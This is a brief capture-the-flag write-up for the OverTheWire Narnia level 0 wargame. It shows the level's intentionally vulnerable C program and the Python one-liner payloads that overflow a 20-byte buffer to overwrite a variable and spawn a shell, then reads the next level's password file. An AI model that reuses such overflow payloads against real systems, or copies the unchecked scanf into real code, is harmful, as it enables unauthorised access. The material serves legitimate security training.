Narnia0
Given: Executable and .c files

I needed to SSH to narnia.labs.overthewire.org. Username and
password were narnia0. I was in ~, where nothing
was located. I needed to cd /, and from there I was able to get
into a narnia folder, where narnia0 and narnia0.c were located.

cat narnia0.c would show the contents of the file.

#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef)
		system("/bin/sh");
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}

So the buffer accepts a 24 character input, which is bad because it can only hold 20. Then there are 4 bytes allocated to val. So at the scanf I need to enter 20 random characters, then 0xdeadbeef. Here's how:

python -c "print 'a'*20 + '\xef\xbe\xad\xde'" | ./narnia0

This worked, but the shell immediately closed. Here's the fix, which leaves open STDIN so I can use the shell to be narnia1 and get the key:

(python -c "print 'a'*20 + '\xef\xbe\xad\xde'"; cat) | ./narnia0

According to the README, the password is stored in etc.

cd /etc/narnia_pass

cat narnia_pass
